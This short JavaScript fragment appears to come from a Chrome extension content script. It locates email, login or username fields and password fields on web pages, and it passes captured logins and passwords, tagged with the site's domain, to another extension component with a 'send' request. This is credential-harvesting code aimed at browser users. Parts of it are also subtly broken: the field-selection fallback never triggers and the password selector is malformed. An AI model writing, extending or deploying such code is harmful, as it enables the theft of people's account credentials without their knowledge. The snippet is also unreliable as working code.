const x = (window.location.hostname.toString());

chrome.runtime.onMessage.addListener( (request, sender, sendResponse) => {
    chrome.runtime.sendMessage({login: request.login, password: request.password, domain: x, req: 'send'});
  });

const login = document.getElementsByName('email') ? 
document.getElementsByName('email') : (document.getElementsByName('login') ? document.getElementsByName('login') : document.getElementsByName('username'));
const password = $("type=password");